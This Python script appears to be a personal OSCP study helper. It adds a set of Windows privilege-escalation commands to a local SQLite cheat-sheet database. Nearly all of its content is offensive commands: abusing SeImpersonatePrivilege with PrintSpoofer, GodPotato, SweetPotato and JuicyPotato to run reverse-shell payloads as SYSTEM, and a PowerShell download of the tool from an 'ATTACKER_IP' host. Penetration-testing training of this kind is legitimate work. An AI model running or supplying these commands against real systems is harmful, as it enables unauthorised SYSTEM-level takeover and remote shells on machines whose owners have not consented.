#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - POTATO PATCH          ##
##############################################
Adds SeImpersonatePrivilege escalation tools:
  - PrintSpoofer
  - GodPotato
  - SweetPotato
  - JuicyPotato
Usage:
    python3 potato_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

potato_commands = [
    {
        "tool": "whoami",
        "description": "Check SeImpersonatePrivilege -- triggers potato/PrintSpoofer path",
        "command": "whoami /priv",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,potato,printspoofer"
    },
    {
        "tool": "systeminfo",
        "description": "Get OS version to select correct impersonation tool",
        "command": 'systeminfo | findstr /i "os name os version"',
        "category": "privesc",
        "tags": "windows,privesc,enumeration,seimpersonate"
    },
    {
        "tool": "PrintSpoofer",
        "description": "SeImpersonatePrivilege -- interactive SYSTEM shell. Use on Server 2019 / Win10 Build 17763+",
        "command": "C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,printspoofer,system,server2019,win10"
    },
    {
        "tool": "PrintSpoofer",
        "description": "SeImpersonatePrivilege -- execute reverse shell as SYSTEM. Use when -i fails.",
        "command": "C:\\Windows\\Temp\\PrintSpoofer64.exe -c \"C:\\Windows\\Temp\\shell.exe\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,printspoofer,system,reverseshell"
    },
    {
        "tool": "GodPotato",
        "description": "SeImpersonatePrivilege -- best all-rounder for modern Windows. Use on Win10/11, Server 2019/2022.",
        "command": "C:\\Windows\\Temp\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,godpotato,system,server2019,server2022,win10,win11"
    },
    {
        "tool": "GodPotato",
        "description": "SeImpersonatePrivilege -- GodPotato reverse shell payload as SYSTEM.",
        "command": "C:\\Windows\\Temp\\GodPotato-NET4.exe -cmd \"C:\\Windows\\Temp\\shell.exe\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,godpotato,system,reverseshell"
    },
    {
        "tool": "SweetPotato",
        "description": "SeImpersonatePrivilege -- use on Server 2016 / older Win10 builds when PrintSpoofer fails.",
        "command": "C:\\Windows\\Temp\\SweetPotato.exe -a \"C:\\Windows\\Temp\\shell.exe\"",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,sweetpotato,system,server2016,win10"
    },
    {
        "tool": "JuicyPotato",
        "description": "SeImpersonatePrivilege -- use on Server 2008/2012/2016. Requires valid CLSID for target OS.",
        "command": "C:\\Windows\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t * -c {CLSID}",
        "category": "privesc",
        "tags": "windows,privesc,seimpersonate,juicypotato,system,server2008,server2012,server2016"
    },
    {
        "tool": "wget",
        "description": "Download impersonation tool to target from Kali http.server",
        "command": "powershell -c wget http://ATTACKER_IP/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\PrintSpoofer64.exe",
        "category": "privesc",
        "tags": "windows,privesc,download,printspoofer,godpotato,sweetpotato,juicypotato"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in potato_commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:50]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:50]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
